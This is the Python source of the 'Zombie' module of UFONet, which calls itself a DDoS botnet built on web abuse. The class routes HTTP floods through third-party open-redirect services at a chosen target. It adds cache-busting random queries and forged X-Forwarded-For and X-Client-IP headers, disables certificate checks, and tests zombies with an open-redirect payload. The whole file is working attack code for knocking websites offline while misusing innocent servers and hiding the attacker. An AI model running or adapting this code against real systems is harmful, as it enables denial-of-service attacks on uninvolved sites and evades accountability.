#!/usr/bin/env python 
# -*- coding: utf-8 -*-"
"""
UFONet - DDoS Botnet via Web Abuse - 2013/2014/2015 - by psy (epsylon@riseup.net)

You should have received a copy of the GNU General Public License along
with UFONet; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
"""
import pycurl, StringIO, md5, re
import time, threading, random
from randomip import RandomIP

class Zombie: # class representing a zombie
    # constructor: function to construct a zombie 
    # ufo: UFONet object, some state variables are recovered as well
    # zombie: name/url of zombie
    def __init__(self, ufo, zombie):
        self.ufo = ufo
        self.payload=ufo.payload
        self.attack_mode=ufo.attack_mode
        self.zombie = zombie
        self.connection_failed=True

    # wait for semaphore to be ready, add to herd, connect & suicide
    def connect(self):
        reply=None
        with self.ufo.sem:
            self.ufo.herd.new_zombie(self.zombie)
            reply=self.do_connect()
            self.ufo.herd.kill_zombie(self.zombie, reply, self.connection_failed)
            return reply

    # handles zombie connection
    def do_connect(self):
        # connect zombies and manage different options: HEAD, GET, POST,
        # user-Agent, referer, timeout, retries, threads, delay..
        options = self.ufo.options
        c = pycurl.Curl()
        if self.ufo.head == True:
            c.setopt(pycurl.URL, self.zombie) # set 'self.zombie' target
            c.setopt(pycurl.NOBODY, 1) # use HEAD
        if self.payload == True:
            payload = self.zombie + "https://www.whitehouse.gov" #Open Redirect payload [requested by all UFONet motherships ;-)]
            c.setopt(pycurl.URL, payload) # set 'self.zombie' payload
            c.setopt(pycurl.NOBODY, 0) # use GET
        if self.ufo.external == True:
            external_service = "http://www.downforeveryoneorjustme.com/" # external check
            if options.target.startswith('https://'): # fixing url prefix
                options.target = options.target.replace('https://','')
            if options.target.startswith('http://'): # fixing url prefix
                options.target = options.target.replace('http://','')
            external = external_service + options.target
            c.setopt(pycurl.URL, external) # external HEAD check before to attack
            c.setopt(pycurl.NOBODY, 0) # use GET
        if self.attack_mode == True:
            if options.place: # use self.zombie's vector to connect to a target's place and add a random query to evade cache
                random_name_hash = random.randint(1, 100000000) 
                random_hash = random.randint(1, 100000000)
                if options.place.endswith("/"):
                    options.place = re.sub('/$', '', options.place)
                if options.place.startswith("/"):
                    if "?" in options.place:
                        url_attack = self.zombie + options.target + options.place + "&" + str(random_name_hash) + "=" + str(random_hash)
                    else:
                        url_attack = self.zombie + options.target + options.place + "?" + str(random_name_hash) + "=" + str(random_hash)
                else:
                    if "?" in options.place:
                        url_attack = self.zombie + options.target + "/" + options.place + "&" + str(random_name_hash) + "=" + str(random_hash)
                    else:
                        url_attack = self.zombie + options.target + "/" + options.place + "?" + str(random_name_hash) + "=" + str(random_hash)
            else:                                    
                url_attack = self.zombie + options.target # Use self.zombie vector to connect to original target url
            if self.ufo.options.verbose:
                print "[INFO] Payload:", url_attack
            c.setopt(pycurl.URL, url_attack) # GET connection on target site
            c.setopt(pycurl.NOBODY, 0)  # use GET
        # set fake headers (important: no-cache)
        fakeheaders = ['Accept: image/gif, image/x-bitmap, image/jpeg, image/pjpeg', 
                       'Connection: Keep-Alive', 
                       'Content-type: application/x-www-form-urlencoded; charset=UTF-8', 
                       'Cache-control: no-cache', 
                       'Pragma: no-cache', 
                       'Pragma-directive: no-cache', 
                       'Cache-directive: no-cache', 
                       'Expires: 0'] 
        c.setopt(pycurl.FOLLOWLOCATION, 1) # set follow redirects
        c.setopt(pycurl.MAXREDIRS, 10) # set max redirects
        c.setopt(pycurl.SSL_VERIFYHOST, 0) # don't verify host
        c.setopt(pycurl.SSL_VERIFYPEER, 0) # don't verify peer
        c.setopt(pycurl.SSLVERSION, pycurl.SSLVERSION_SSLv3) # sslv3
        c.setopt(pycurl.COOKIEFILE, '/dev/null') # black magic
        c.setopt(pycurl.COOKIEJAR, '/dev/null') # black magic
        c.setopt(pycurl.FRESH_CONNECT, 1) # important: no cache!
        c.setopt(pycurl.NOSIGNAL, 1) # pass 'long' to stack to fix libcurl bug
        if options.xforw: # set x-forwarded-for
            generate_random_xforw = RandomIP()
            xforwip = generate_random_xforw._generateip('')
            xforwfakevalue = ['X-Forwarded-For: ' + str(xforwip)]
            fakeheaders = fakeheaders + xforwfakevalue
        if options.xclient: # set x-client-ip
            generate_random_xclient = RandomIP()
            xclientip = generate_random_xclient._generateip('')
            xclientfakevalue = ['X-Client-IP: ' + str(xclientip)]
            fakeheaders = fakeheaders + xclientfakevalue
        if options.host: # set http host header
            host_fakevalue = ['Host: ' + str(options.host)]
            fakeheaders = fakeheaders + host_fakevalue
        c.setopt(pycurl.HTTPHEADER, fakeheaders) # set fake headers
        b = StringIO.StringIO()
        c.setopt(pycurl.HEADERFUNCTION, b.write)
        h = StringIO.StringIO()
        c.setopt(pycurl.WRITEFUNCTION, h.write)
        if options.agent: # set user-agent
            c.setopt(pycurl.USERAGENT, options.agent)
        else:
            c.setopt(pycurl.USERAGENT, self.ufo.user_agent)
        if options.referer: # set referer
            c.setopt(pycurl.REFERER, options.referer)
        else:
            c.setopt(pycurl.REFERER, self.ufo.referer)
        if options.proxy: # set proxy
            c.setopt(pycurl.PROXY, options.proxy)
        else:
            c.setopt(pycurl.PROXY, '')
        if options.timeout: # set timeout
            c.setopt(pycurl.TIMEOUT, options.timeout)
            c.setopt(pycurl.CONNECTTIMEOUT, options.timeout)
        else:
            c.setopt(pycurl.TIMEOUT, 10)
            c.setopt(pycurl.CONNECTTIMEOUT, 10)
        if options.delay: # set delay
            self.ufo.delay = options.delay
        else:
            self.ufo.delay = 0
        if options.retries: # set retries
            self.ufo.retries = options.retries
        else:
            self.ufo.retries = 1
        try: # try to connect
            c.perform()
            time.sleep(self.ufo.delay)
            self.connection_failed = False
        except Exception, e: # try retries
            for count in range(0, self.ufo.retries):
                time.sleep(self.ufo.delay)
                try:
                    c.perform()
                    self.connection_failed = False
                except:
                    self.connection_failed = True
        if self.ufo.head == True: # HEAD reply
            code_reply = c.getinfo(pycurl.HTTP_CODE)
            reply = b.getvalue()
            if options.verbose:
                print "Reply:"
                print "\n", reply
            return code_reply
        if self.ufo.external == True: # External reply
            external_reply = h.getvalue()
            if options.verbose:
                print "Reply:"
                print "\n", external_reply
            return external_reply
        if self.payload == True: # Payloads reply
            payload_reply = h.getvalue()
            if options.verbose:
                print "Reply:"
                print "\n", payload_reply
            return payload_reply
        if self.attack_mode == True: # Attack mode reply
            attack_reply = h.getvalue()
            if options.verbose:
                print "[Response] code: ", c.getinfo(c.RESPONSE_CODE)," time ",c.getinfo(c.TOTAL_TIME)," size ", len(attack_reply)
            return [    c.getinfo(c.RESPONSE_CODE), 
                        c.getinfo(c.TOTAL_TIME), 
                        len(attack_reply)]
